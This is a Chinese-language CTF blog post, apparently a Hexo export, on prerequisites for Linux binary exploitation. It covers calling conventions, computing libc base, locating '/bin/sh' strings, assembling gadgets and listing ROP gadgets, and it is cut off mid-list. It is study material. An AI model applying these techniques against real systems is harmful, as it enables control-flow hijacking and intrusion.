None ranges\nFound 6 results, display max 6 items:\n[stack] : 0x7fffffffdff6 (\"/home/tianji/Desktop/pwn/jarvis/smashes/smashes\")\n[stack] : 0x7fffffffe8f4 (\"/home/tianji/Desktop/pwn/jarvis\")\n[stack] : 0x7fffffffeb12 (\"/home/tianji/Desktop/pwn/jarvis/smashes\")\n[stack] : 0x7fffffffeb48 (\"/home/tianji\")\n[stack] : 0x7fffffffeee7 (\"/home/tianji/.vimpkg/bin\")\n[stack] : 0x7fffffffefc8 (\"/home/tianji/Desktop/pwn/jarvis/smashes/smashes\")\ngdb-peda$ find 0x7fffffffdff6\nSearching for '0x7fffffffdff6' in: None ranges\nFound 2 results, display max 2 items:\n   libc : 0x7ffff7dd0508 --> 0x7fffffffdff6 (\"/home/tianji/Desktop/pwn/jarvis/smashes/smashes\")\n[stack] : 0x7fffffffdc68 --> 0x7fffffffdff6 (\"/home/tianji/Desktop/pwn/jarvis/smashes/smashes\")\ngdb-peda$ distance $rsp 0x7fffffffdc68\nFrom 0x7fffffffda50 to 0x7fffffffdc68: 536 bytes, 134 dwords\n```\n\n首先搜索字符串\"/home\",第一个地址是真实地址，在搜索指向该地址的指针，该指针也就是我们要找的argv[0]的地址。\n\n当前$rsp的值就是 存在栈溢出变量的地址","slug":"pwn前置知识","published":1,"updated":"2018-06-13T11:24:26.188Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jpk000mly4jidhqfwc4","content":"<h2 id=\"调用约定\"><a href=\"#调用约定\" class=\"headerlink\" title=\"调用约定\"></a>调用约定</h2><p>32位和64位程序的区别, 更多的是体现在<a href=\"https://en.wikipedia.org/wiki/X86_calling_conventions\" target=\"_blank\" rel=\"noopener\">调用约定(Calling Convention)</a>上. 因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递 而不是通过栈, 来获得更高的运行速度.</p>\n<p>本文主要是介绍Linux平台下的漏洞利用, 所以就专注于<code>System V AMD64 ABI</code> 的调用约定, 即函数参数从左到右依次用寄存器RDI,RSI,RDX,RCX,R8,R9来进行传递, 如果参数个数多于6个, 再通过栈来进行传递.</p>\n<pre><code>$ cat victim.c\nint foo(int a, int b, int c,  int d,  int e,  int f,  int g,  int h) {\n    return a + b + c + d + e + f + g + h;\n}\nint main() {\n    foo(1, 2, 3, 4, 5, 6, 7, 8);\n    return 0;\n}\n$ gcc victim.c -o victim\n$ objdump -d victim | grep &quot;&lt;main&gt;:&quot; -A 11\n00000000000006a0 &lt;main&gt;:\n 6a0:   55                      push   rbp\n 6a1:   48 89 e5                mov    rbp,rsp\n 6a4:   6a 08                   push   0x8\n 6a6:   6a 07                   push   0x7\n 6a8:   41 b9 06 00 00 00       mov    r9d,0x6\n 6ae:   41 b8 05 00 00 00       mov    r8d,0x5\n 6b4:   b9 04 00 00 00          mov    ecx,0x4\n 6b9:   ba 03 00 00 00          mov    edx,0x3\n 6be:   be 02 00 00 00          mov    esi,0x2\n 6c3:   bf 01 00 00 00          mov    edi,0x1\n 6c8:   e8 93 ff ff ff          call   660 &lt;foo&gt;\n</code></pre><h2 id=\"查找libc基地址\"><a href=\"#查找libc基地址\" class=\"headerlink\" title=\"查找libc基地址\"></a>查找libc基地址</h2><p>方法一:</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ LD_TRACE_LOADED_OBJECTS=1 ./vuln\n    linux-vdso.so.1 (0x00007ffff7ffa000)\n    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e4000)\n    /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd5000)\n</code></pre><p>方法二:</p>\n<p>首先查找libc中某一函数的偏移，以system为例:</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system@\n   607: 000000000004f440    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE\n  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5\n</code></pre><p>或者使用ida也可以查找函数的偏移。</p>\n<p>寻找system的绝对地址：</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ p system\n$1 = {&lt;text variable, no debug info&gt;} 0x5d0 &lt;system@plt&gt;\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \nasdf\nasdf\n\n[Inferior 1 (process 7107) exited normally]\nWarning: not running or target is remote\ngdb-peda$ p system\n$2 = {int (const char *)} 0x7ffff7a33440 &lt;__libc_system&gt;\n</code></pre><p>然后就可以计算libc的基地址:</p>\n<blockquote>\n<p> 0x7ffff7a33440 - 0x4f440 = 0x7ffff79e4000</p>\n</blockquote>\n<h2 id=\"查找”-bin-sh”的偏移地址\"><a href=\"#查找”-bin-sh”的偏移地址\" class=\"headerlink\" title=\"查找”/bin/sh”的偏移地址\"></a>查找”/bin/sh”的偏移地址</h2><p>方法一:</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -z -s /bin/sh /lib/x86_64-linux-gnu/libc.so.6\n0x1b3e9a\n</code></pre><p>方法二:</p>\n<p>在ida中查找。</p>\n<p>方法三:</p>\n<p>在环境变量中查找。</p>\n<pre><code class=\"shell\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ b *main\nBreakpoint 2 at 0x555555554739: file vuln.c, line 17.\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \n\n[----------------------------------registers-----------------------------------]\nRAX: 0x555555554739 (&lt;main&gt;:    push   rbp)\nRBX: 0x0 \nRCX: 0x555555554790 (&lt;__libc_csu_init&gt;:    push   r15)\nRDX: 0x7fffffffddf8 --&gt; 0x7fffffffe1c7 (&quot;CLUTTER_IM_MODULE=xim&quot;)\nRSI: 0x7fffffffdde8 --&gt; 0x7fffffffe199 (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)\nRDI: 0x1 \nRBP: 0x555555554790 (&lt;__libc_csu_init&gt;:    push   r15)\nRSP: 0x7fffffffdd08 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:    mov    edi,eax)\nRIP: 0x555555554739 (&lt;main&gt;:    push   rbp)\nR8 : 0x7ffff7dd0d80 --&gt; 0x0 \nR9 : 0x7ffff7dd0d80 --&gt; 0x0 \nR10: 0x0 \nR11: 0x1 \nR12: 0x555555554610 (&lt;_start&gt;:    xor    ebp,ebp)\nR13: 0x7fffffffdde0 --&gt; 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x55555555472a &lt;shell+16&gt;:    call   0x5555555545d0 &lt;system@plt&gt;\n   0x55555555472f &lt;shell+21&gt;:    mov    edi,0x0\n   0x555555554734 &lt;shell+26&gt;:    call   0x5555555545f0 &lt;exit@plt&gt;\n=&gt; 0x555555554739 &lt;main&gt;:    push   rbp\n   0x55555555473a &lt;main+1&gt;:    mov    rbp,rsp\n   0x55555555473d &lt;main+4&gt;:    sub    rsp,0x120\n   0x555555554744 &lt;main+11&gt;:    mov    DWORD PTR [rbp-0x114],edi\n   0x55555555474a &lt;main+17&gt;:    mov    QWORD PTR [rbp-0x120],rsi\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdd08 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:    mov    edi,eax)\n0008| 0x7fffffffdd10 --&gt; 0x1 \n0016| 0x7fffffffdd18 --&gt; 0x7fffffffdde8 --&gt; 0x7fffffffe199 (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)\n0024| 0x7fffffffdd20 --&gt; 0x100008000 \n0032| 0x7fffffffdd28 --&gt; 0x555555554739 (&lt;main&gt;:    push   rbp)\n0040| 0x7fffffffdd30 --&gt; 0x0 \n0048| 0x7fffffffdd38 --&gt; 0xbd88a50cb0fd83be \n0056| 0x7fffffffdd40 --&gt; 0x555555554610 (&lt;_start&gt;:    xor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17\nwarning: Source file is more recent than executable.\n17    int main(int argc, char* argv[]) {\ngdb-peda$ telescope 100\n0000| 0x7fffffffdd08 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:    mov    edi,eax)\n0008| 0x7fffffffdd10 --&gt; 0x1 \n0016| 0x7fffffffdd18 --&gt; 0x7fffffffdde8 --&gt; 0x7fffffffe199 (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)\n0024| 0x7fffffffdd20 --&gt; 0x100008000 \n0032| 0x7fffffffdd28 --&gt; 0x555555554739 (&lt;main&gt;:    push   rbp)\n0040| 0x7fffffffdd30 --&gt; 0x0 \n0048| 0x7fffffffdd38 --&gt; 0xbd88a50cb0fd83be \n0056| 0x7fffffffdd40 --&gt; 0x555555554610 (&lt;_start&gt;:    xor    ebp,ebp)\n0064| 0x7fffffffdd48 --&gt; 0x7fffffffdde0 --&gt; 0x1 \n0072| 0x7fffffffdd50 --&gt; 0x0 \n0080| 0x7fffffffdd58 --&gt; 0x0 \n0088| 0x7fffffffdd60 --&gt; 0xe8ddf05985fd83be \n0096| 0x7fffffffdd68 --&gt; 0xe8dde0e6894383be \n0104| 0x7fffffffdd70 --&gt; 0x7fff00000000 \n0112| 0x7fffffffdd78 --&gt; 0x0 \n0120| 0x7fffffffdd80 --&gt; 0x0 \n0128| 0x7fffffffdd88 --&gt; 0x7ffff7de5733 (&lt;_dl_init+259&gt;:    add    r14,0x8)\n0136| 0x7fffffffdd90 --&gt; 0x7ffff7dcb638 --&gt; 0x7ffff7b7de10 --&gt; 0x8348535554415541 \n0144| 0x7fffffffdd98 --&gt; 0x2225ab63 \n0152| 0x7fffffffdda0 --&gt; 0x0 \n0160| 0x7fffffffdda8 --&gt; 0x0 \n0168| 0x7fffffffddb0 --&gt; 0x0 \n0176| 0x7fffffffddb8 --&gt; 0x555555554610 (&lt;_start&gt;:    xor    ebp,ebp)\n0184| 0x7fffffffddc0 --&gt; 0x7fffffffdde0 --&gt; 0x1 \n0192| 0x7fffffffddc8 --&gt; 0x55555555463a (&lt;_start+42&gt;:    hlt)\n--More--(25/100)\n0200| 0x7fffffffddd0 --&gt; 0x7fffffffddd8 --&gt; 0x1c \n0208| 0x7fffffffddd8 --&gt; 0x1c \n0216| 0x7fffffffdde0 --&gt; 0x1 \n0224| 0x7fffffffdde8 --&gt; 0x7fffffffe199 (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)\n0232| 0x7fffffffddf0 --&gt; 0x0 \n0240| 0x7fffffffddf8 --&gt; 0x7fffffffe1c7 (&quot;CLUTTER_IM_MODULE=xim&quot;)\n0248| 0x7fffffffde00 --&gt; 0x7fffffffe1dd (&quot;LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc&quot;...)\n0256| 0x7fffffffde08 --&gt; 0x7fffffffe7c9 (&quot;LC_MEASUREMENT=zh_CN.UTF-8&quot;)\n0264| 0x7fffffffde10 --&gt; 0x7fffffffe7e4 (&quot;LESSCLOSE=/usr/bin/lesspipe %s %s&quot;)\n0272| 0x7fffffffde18 --&gt; 0x7fffffffe806 (&quot;LC_PAPER=zh_CN.UTF-8&quot;)\n0280| 0x7fffffffde20 --&gt; 0x7fffffffe81b (&quot;LC_MONETARY=zh_CN.UTF-8&quot;)\n0288| 0x7fffffffde28 --&gt; 0x7fffffffe833 (&quot;XDG_MENU_PREFIX=gnome-&quot;)\n0296| 0x7fffffffde30 --&gt; 0x7fffffffe84a (&quot;_=/usr/bin/gdb&quot;)\n0304| 0x7fffffffde38 --&gt; 0x7fffffffe859 (&quot;LANG=en_US.UTF-8&quot;)\n0312| 0x7fffffffde40 --&gt; 0x7fffffffe86a (&quot;DISPLAY=:0&quot;)\n0320| 0x7fffffffde48 --&gt; 0x7fffffffe875 (&quot;OLDPWD=/home/tianji/Desktop/sploit&quot;)\n0328| 0x7fffffffde50 --&gt; 0x7fffffffe898 (&quot;GNOME_SHELL_SESSION_MODE=ubuntu&quot;)\n0336| 0x7fffffffde58 --&gt; 0x7fffffffe8b8 (&quot;COLORTERM=truecolor&quot;)\n0344| 0x7fffffffde60 --&gt; 0x7fffffffe8cc (&quot;USERNAME=tianji&quot;)\n0352| 0x7fffffffde68 --&gt; 0x7fffffffe8dc (&quot;XDG_VTNR=1&quot;)\n0360| 0x7fffffffde70 --&gt; 0x7fffffffe8e7 (&quot;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&quot;)\n0368| 0x7fffffffde78 --&gt; 0x7fffffffe910 (&quot;MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path&quot;)\n0376| 0x7fffffffde80 --&gt; 0x7fffffffe946 (&quot;LC_NAME=zh_CN.UTF-8&quot;)\n0384| 0x7fffffffde88 --&gt; 0x7fffffffe95a (&quot;XDG_SESSION_ID=1&quot;)\n0392| 0x7fffffffde90 --&gt; 0x7fffffffe96b (&quot;USER=tianji&quot;)\n--More--(50/100)\n0400| 0x7fffffffde98 --&gt; 0x7fffffffe977 (&quot;DESKTOP_SESSION=ubuntu&quot;)\n0408| 0x7fffffffdea0 --&gt; 0x7fffffffe98e (&quot;QT4_IM_MODULE=fcitx&quot;)\n0416| 0x7fffffffdea8 --&gt; 0x7fffffffe9a2 (&quot;TEXTDOMAINDIR=/usr/share/locale/&quot;)\n0424| 0x7fffffffdeb0 --&gt; 0x7fffffffe9c3 (&quot;GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/d3da222f_3cd5_4897_a029_a411cbf1e9fa&quot;)\n0432| 0x7fffffffdeb8 --&gt; 0x7fffffffea19 (&quot;DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path&quot;)\n0440| 0x7fffffffdec0 --&gt; 0x7fffffffea4c (&quot;PWD=/home/tianji/Desktop/sploit/bypassaslr_1&quot;)\n0448| 0x7fffffffdec8 --&gt; 0x7fffffffea79 (&quot;LINES=24&quot;)\n0456| 0x7fffffffded0 --&gt; 0x7fffffffea82 (&quot;HOME=/home/tianji&quot;)\n0464| 0x7fffffffded8 --&gt; 0x7fffffffea94 (&quot;TEXTDOMAIN=im-config&quot;)\n0472| 0x7fffffffdee0 --&gt; 0x7fffffffeaa9 (&quot;SSH_AGENT_PID=1606&quot;)\n0480| 0x7fffffffdee8 --&gt; 0x7fffffffeabc (&quot;QT_ACCESSIBILITY=1&quot;)\n0488| 0x7fffffffdef0 --&gt; 0x7fffffffeacf (&quot;XDG_SESSION_TYPE=x11&quot;)\n0496| 0x7fffffffdef8 --&gt; 0x7fffffffeae4 (&quot;XDG_DATA_DIRS=/usr/share/ubuntu:/usr/local/share:/usr/share:/var/lib/snapd/desktop&quot;)\n0504| 0x7fffffffdf00 --&gt; 0x7fffffffeb37 (&quot;XDG_SESSION_DESKTOP=ubuntu&quot;)\n0512| 0x7fffffffdf08 --&gt; 0x7fffffffeb52 (&quot;LC_ADDRESS=zh_CN.UTF-8&quot;)\n0520| 0x7fffffffdf10 --&gt; 0x7fffffffeb69 (&quot;GJS_DEBUG_OUTPUT=stderr&quot;)\n0528| 0x7fffffffdf18 --&gt; 0x7fffffffeb81 (&quot;LC_NUMERIC=zh_CN.UTF-8&quot;)\n0536| 0x7fffffffdf20 --&gt; 0x7fffffffeb98 (&quot;ALL_PROXY=socks://127.0.0.1:1080/&quot;)\n0544| 0x7fffffffdf28 --&gt; 0x7fffffffebba (&quot;no_proxy=localhost,127.0.0.0/8,::1&quot;)\n0552| 0x7fffffffdf30 --&gt; 0x7fffffffebdd (&quot;GTK_MODULES=gail:atk-bridge&quot;)\n0560| 0x7fffffffdf38 --&gt; 0x7fffffffebf9 (&quot;NO_PROXY=localhost,127.0.0.0/8,::1&quot;)\n0568| 0x7fffffffdf40 --&gt; 0x7fffffffec1c (&quot;COLUMNS=79&quot;)\n0576| 0x7fffffffdf48 --&gt; 0x7fffffffec27 (&quot;WINDOWPATH=1&quot;)\n0584| 0x7fffffffdf50 --&gt; 0x7fffffffec34 (&quot;SHELL=/bin/bash&quot;)\n0592| 0x7fffffffdf58 --&gt; 0x7fffffffec44 (&quot;VTE_VERSION=5201&quot;)\n</code></pre>\n<p>我们可以看到“SHELL=/bin/bash”的地址:<code>0x7fffffffec34</code>,然后去掉<code>SHELL</code>,这样“/bin/bash”的地址就是<code>0x7fffffffec3a</code></p>\n<pre><code>gdb-peda$ x/s 0x7fffffffec3a\n0x7fffffffec3a:    &quot;/bin/bash&quot;\n</code></pre><p>当然，我这里是”/bin/bash”,所以这方法不可行。这时候，可以添加环境变量。</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ export ABC=/bin/sh\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ b *main\nBreakpoint 2 at 0x739: file vuln.c, line 17.\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \n\n[----------------------------------registers-----------------------------------]\nRAX: 0x555555554739 (&lt;main&gt;:    push   rbp)\nRBX: 0x0 \nRCX: 0x555555554790 (&lt;__libc_csu_init&gt;:    push   r15)\nRDX: 0x7fffffffdde8 --&gt; 0x7fffffffe1bb (&quot;CLUTTER_IM_MODULE=xim&quot;)\nRSI: 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)\nRDI: 0x1 \nRBP: 0x555555554790 (&lt;__libc_csu_init&gt;:    push   r15)\nRSP: 0x7fffffffdcf8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:    mov    edi,eax)\nRIP: 0x555555554739 (&lt;main&gt;:    push   rbp)\nR8 : 0x7ffff7dd0d80 --&gt; 0x0 \nR9 : 0x7ffff7dd0d80 --&gt; 0x0 \nR10: 0x0 \nR11: 0x1 \nR12: 0x555555554610 (&lt;_start&gt;:    xor    ebp,ebp)\nR13: 0x7fffffffddd0 --&gt; 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x55555555472a &lt;shell+16&gt;:    call   0x5555555545d0 &lt;system@plt&gt;\n   0x55555555472f &lt;shell+21&gt;:    mov    edi,0x0\n   0x555555554734 &lt;shell+26&gt;:    call   0x5555555545f0 &lt;exit@plt&gt;\n=&gt; 0x555555554739 &lt;main&gt;:    push   rbp\n   0x55555555473a &lt;main+1&gt;:    mov    rbp,rsp\n   0x55555555473d &lt;main+4&gt;:    sub    rsp,0x120\n   0x555555554744 &lt;main+11&gt;:    mov    DWORD PTR [rbp-0x114],edi\n   0x55555555474a &lt;main+17&gt;:    mov    QWORD PTR [rbp-0x120],rsi\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdcf8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:    mov    edi,eax)\n0008| 0x7fffffffdd00 --&gt; 0x1 \n0016| 0x7fffffffdd08 --&gt; 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)\n0024| 0x7fffffffdd10 --&gt; 0x100008000 \n0032| 0x7fffffffdd18 --&gt; 0x555555554739 (&lt;main&gt;:    push   rbp)\n0040| 0x7fffffffdd20 --&gt; 0x0 \n0048| 0x7fffffffdd28 --&gt; 0x6b6b7edd8dce246d \n0056| 0x7fffffffdd30 --&gt; 0x555555554610 (&lt;_start&gt;:    xor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17\nwarning: Source file is more recent than executable.\n17    int main(int argc, char* argv[]) {\ngdb-peda$ telescope 200\n0000| 0x7fffffffdcf8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:    mov    edi,eax)\n0008| 0x7fffffffdd00 --&gt; 0x1 \n0016| 0x7fffffffdd08 --&gt; 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)\n0024| 0x7fffffffdd10 --&gt; 0x100008000 \n0032| 0x7fffffffdd18 --&gt; 0x555555554739 (&lt;main&gt;:    push   rbp)\n0040| 0x7fffffffdd20 --&gt; 0x0 \n0048| 0x7fffffffdd28 --&gt; 0x6b6b7edd8dce246d \n0056| 0x7fffffffdd30 --&gt; 0x555555554610 (&lt;_start&gt;:    xor    ebp,ebp)\n0064| 0x7fffffffdd38 --&gt; 0x7fffffffddd0 --&gt; 0x1 \n0072| 0x7fffffffdd40 --&gt; 0x0 \n0080| 0x7fffffffdd48 --&gt; 0x0 \n0088| 0x7fffffffdd50 --&gt; 0x3e3e2b88b8ee246d \n0096| 0x7fffffffdd58 --&gt; 0x3e3e3b37b470246d \n0104| 0x7fffffffdd60 --&gt; 0x7fff00000000 \n0112| 0x7fffffffdd68 --&gt; 0x0 \n0120| 0x7fffffffdd70 --&gt; 0x0 \n0128| 0x7fffffffdd78 --&gt; 0x7ffff7de5733 (&lt;_dl_init+259&gt;:    add    r14,0x8)\n0136| 0x7fffffffdd80 --&gt; 0x7ffff7dcb638 --&gt; 0x7ffff7b7de10 --&gt; 0x8348535554415541 \n0144| 0x7fffffffdd88 --&gt; 0x22bf66c6 \n0152| 0x7fffffffdd90 --&gt; 0x0 \n0160| 0x7fffffffdd98 --&gt; 0x0 \n0168| 0x7fffffffdda0 --&gt; 0x0 \n0176| 0x7fffffffdda8 --&gt; 0x555555554610 (&lt;_start&gt;:    xor    ebp,ebp)\n0184| 0x7fffffffddb0 --&gt; 0x7fffffffddd0 --&gt; 0x1 \n0192| 0x7fffffffddb8 --&gt; 0x55555555463a (&lt;_start+42&gt;:    hlt)\n--More--(25/200)\n0200| 0x7fffffffddc0 --&gt; 0x7fffffffddc8 --&gt; 0x1c \n0208| 0x7fffffffddc8 --&gt; 0x1c \n0216| 0x7fffffffddd0 --&gt; 0x1 \n0224| 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)\n0232| 0x7fffffffdde0 --&gt; 0x0 \n0240| 0x7fffffffdde8 --&gt; 0x7fffffffe1bb (&quot;CLUTTER_IM_MODULE=xim&quot;)\n0248| 0x7fffffffddf0 --&gt; 0x7fffffffe1d1 (&quot;LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc&quot;...)\n0256| 0x7fffffffddf8 --&gt; 0x7fffffffe7bd (&quot;LC_MEASUREMENT=zh_CN.UTF-8&quot;)\n0264| 0x7fffffffde00 --&gt; 0x7fffffffe7d8 (&quot;LESSCLOSE=/usr/bin/lesspipe %s %s&quot;)\n0272| 0x7fffffffde08 --&gt; 0x7fffffffe7fa (&quot;LC_PAPER=zh_CN.UTF-8&quot;)\n0280| 0x7fffffffde10 --&gt; 0x7fffffffe80f (&quot;LC_MONETARY=zh_CN.UTF-8&quot;)\n0288| 0x7fffffffde18 --&gt; 0x7fffffffe827 (&quot;XDG_MENU_PREFIX=gnome-&quot;)\n0296| 0x7fffffffde20 --&gt; 0x7fffffffe83e (&quot;_=/usr/bin/gdb&quot;)\n0304| 0x7fffffffde28 --&gt; 0x7fffffffe84d (&quot;LANG=en_US.UTF-8&quot;)\n0312| 0x7fffffffde30 --&gt; 0x7fffffffe85e (&quot;DISPLAY=:0&quot;)\n0320| 0x7fffffffde38 --&gt; 0x7fffffffe869 (&quot;ABC=/bin/sh&quot;)\n0328| 0x7fffffffde40 --&gt; 0x7fffffffe875 (&quot;OLDPWD=/home/tianji/Desktop/sploit&quot;)\n0336| 0x7fffffffde48 --&gt; 0x7fffffffe898 (&quot;GNOME_SHELL_SESSION_MODE=ubuntu&quot;)\n0344| 0x7fffffffde50 --&gt; 0x7fffffffe8b8 (&quot;COLORTERM=truecolor&quot;)\n0352| 0x7fffffffde58 --&gt; 0x7fffffffe8cc (&quot;USERNAME=tianji&quot;)\n0360| 0x7fffffffde60 --&gt; 0x7fffffffe8dc (&quot;XDG_VTNR=1&quot;)\n0368| 0x7fffffffde68 --&gt; 0x7fffffffe8e7 (&quot;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&quot;)\n0376| 0x7fffffffde70 --&gt; 0x7fffffffe910 (&quot;MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path&quot;)\n0384| 0x7fffffffde78 --&gt; 0x7fffffffe946 (&quot;LC_NAME=zh_CN.UTF-8&quot;)\n0392| 0x7fffffffde80 --&gt; 0x7fffffffe95a (&quot;XDG_SESSION_ID=1&quot;)\n</code></pre><p>可以看到”/bin/sh”的地址：<code>0x7fffffffe869 + 0x6 = 0x7fffffffe86e</code>。</p>\n<pre><code>gdb-peda$ x/s 0x7fffffffe86e\n0x7fffffffe86e:    &quot;bin/sh&quot;\n</code></pre><p>当然，这个方法仅限本地使用。</p>\n<h2 id=\"反汇编代码\"><a href=\"#反汇编代码\" class=\"headerlink\" title=\"反汇编代码\"></a>反汇编代码</h2><pre><code>tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 &quot;jmp rsp&quot;\nffe4\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 &quot;pop rdi; ret&quot;\n5fc3\ntianji@tianji-machine:~/Desktop/sploit/heap/unlink$ disasm &quot;5fc3&quot;\n   0:    5f                       pop    edi\n   1:    c3                       ret\n</code></pre><h2 id=\"在可执行文件中找gadget\"><a href=\"#在可执行文件中找gadget\" class=\"headerlink\" title=\"在可执行文件中找gadget\"></a>在可执行文件中找gadget</h2><p>方法一:</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -x 5fc3 -X vuln\n0x7f3\n- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n0x000007f3  5fc3 9066 2e0f 1f84 0000 0000 00f3 c300  _..f............\n0x00000803  0048 83ec 0848 83c4 08c3 0000 0001 0002  .H...H..........\n0x00000813  002f 6269 6e2f 7368 0001 1b03 3b40 0000  ./bin/sh....;@..\n0x00000823  0007 0000 0094 fdff ff8c 0000 00e4 fdff  ................\n0x00000833  ffb4 0000 00f4 fdff ff5c 0000 00fe       .........\\....\n</code></pre><p>可以看到5fc3的偏移位置就是: ‘0x7f3’</p>\n<p>方法二:</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all\nGadgets information\n============================================================\n0x0000000000000707 : add bl, dh ; ret\n0x00000000000007ff : add bl, dh ; ret\n0x0000000000000703 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret\n0x0000000000000705 : add byte ptr [rax], al ; add bl, dh ; ret\n0x00000000000007fd : add byte ptr [rax], al ; add bl, dh ; ret\n0x00000000000007fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret\n0x0000000000000786 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret\n0x000000000000066c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006bc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x0000000000000704 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x00000000000007fc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x0000000000000787 : add byte ptr [rax], al ; add cl, cl ; ret\n0x0000000000000788 : add byte ptr [rax], al ; leave ; ret\n0x000000000000066e : add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006be : add byte ptr [rax], al ; pop rbp ; ret\n0x0000000000000706 : add byte ptr [rax], al ; ret\n0x00000000000007fe : add byte ptr [rax], al ; ret\n0x00000000000006fd : add byte ptr [rcx], al ; pop rbp ; ret\n0x0000000000000789 : add cl, cl ; ret\n0x00000000000005a3 : add esp, 8 ; ret\n0x0000000000000809 : add esp, 8 ; ret\n0x00000000000005a2 : add rsp, 8 ; ret\n0x0000000000000808 : add rsp, 8 ; ret\n0x0000000000000599 : and byte ptr [rax], al ; test rax, rax ; je 0x5a9 ; call rax\n0x000000000000065c : and byte ptr [rax], al ; test rax, rax ; je 0x678 ; pop rbp ; jmp rax\n0x00000000000006ad : and byte ptr [rax], al ; test rax, rax ; je 0x6c8 ; pop rbp ; jmp rax\n0x00000000000007d9 : call qword ptr [r12 + rbx*8]\n0x00000000000007da : call qword ptr [rsp + rbx*8]\n0x00000000000005a0 : call rax\n0x00000000000007dc : fmul qword ptr [rax - 0x7d] ; ret\n0x000000000000059e : je 0x5a4 ; call rax\n0x0000000000000661 : je 0x673 ; pop rbp ; jmp rax\n0x00000000000006b2 : je 0x6c3 ; pop rbp ; jmp rax\n0x0000000000000664 : 